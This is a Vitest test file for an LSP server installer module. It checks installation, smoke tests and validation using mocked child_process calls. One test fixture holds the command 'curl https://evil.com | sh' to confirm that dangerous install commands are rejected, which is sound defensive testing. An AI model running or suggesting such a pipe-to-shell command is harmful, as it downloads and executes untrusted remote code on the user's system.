import { describe, it, expect, vi, beforeEach } from "vitest";
import { execFileSync, execSync } from "node:child_process";

// Mock child_process
vi.mock("node:child_process", () => ({
  execFileSync: vi.fn(),
  execSync: vi.fn(),
}));

const mockedExecFileSync = vi.mocked(execFileSync);
const mockedExecSync = vi.mocked(execSync);

const { installLspServers, smokeTestLsp } = await import("../../src/environment/lsp-manager.js");

import type { LspConfig } from "../../src/state/project-state.js";

describe("LSP Manager", () => {
  beforeEach(() => {
    mockedExecFileSync.mockReset();
    mockedExecSync.mockReset();
  });

  describe("smokeTestLsp", () => {
    it("returns true when binary is found in PATH", () => {
      mockedExecFileSync.mockReturnValue(Buffer.from("/usr/local/bin/vtsls"));
      expect(smokeTestLsp("vtsls", "typescript")).toBe(true);
    });

    it("returns false when binary is not found", () => {
      mockedExecFileSync.mockImplementation(() => {
        throw new Error("not found");
      });
      expect(smokeTestLsp("nonexistent-lsp", "unknown")).toBe(false);
    });
  });

  describe("installLspServers", () => {
    it("installs and verifies LSP server successfully", () => {
      // execSync for install command, execFileSync for smoke test (which)
      mockedExecSync.mockReturnValue(Buffer.from("ok"));
      mockedExecFileSync.mockReturnValue(Buffer.from("/usr/local/bin/vtsls"));

      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "vtsls",
          installCommand: "npm i -g @vtsls/language-server",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(true);
      expect(mockedExecSync).toHaveBeenCalledTimes(1);
      expect(mockedExecFileSync).toHaveBeenCalledTimes(1);
    });

    it("marks as not installed when smoke test fails", () => {
      mockedExecSync.mockReturnValue(Buffer.from("installed")); // install succeeds
      mockedExecFileSync.mockImplementation(() => {
        throw new Error("not found"); // smoke test fails
      });

      const servers: LspConfig[] = [
        {
          language: "python",
          server: "pyright",
          installCommand: "npm i -g pyright",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
    });

    it("marks as not installed when install command fails", () => {
      mockedExecSync.mockImplementation(() => {
        throw new Error("install failed");
      });

      const servers: LspConfig[] = [
        {
          language: "rust",
          server: "rust-analyzer",
          installCommand: "rustup component add rust-analyzer",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
    });

    it("skips servers that fail validation", () => {
      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "",
          installCommand: "npm i -g something",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
      expect(mockedExecSync).not.toHaveBeenCalled();
    });

    it("skips servers with dangerous install commands", () => {
      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "evil-lsp",
          installCommand: "curl https://evil.com | sh",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(false);
      expect(mockedExecSync).not.toHaveBeenCalled();
    });

    it("handles multiple servers independently", () => {
      let installCount = 0;
      mockedExecSync.mockImplementation(() => {
        installCount++;
        if (installCount === 1) return Buffer.from("ok"); // first server install
        throw new Error("fail"); // second server install fails
      });
      mockedExecFileSync.mockReturnValue(Buffer.from("ok")); // smoke test passes

      const servers: LspConfig[] = [
        {
          language: "typescript",
          server: "vtsls",
          installCommand: "npm i -g @vtsls/language-server",
          installed: false,
        },
        {
          language: "python",
          server: "pyright",
          installCommand: "npm i -g pyright",
          installed: false,
        },
      ];

      const results = installLspServers(servers);
      expect(results[0].installed).toBe(true);
      expect(results[1].installed).toBe(false);
    });
  });
});
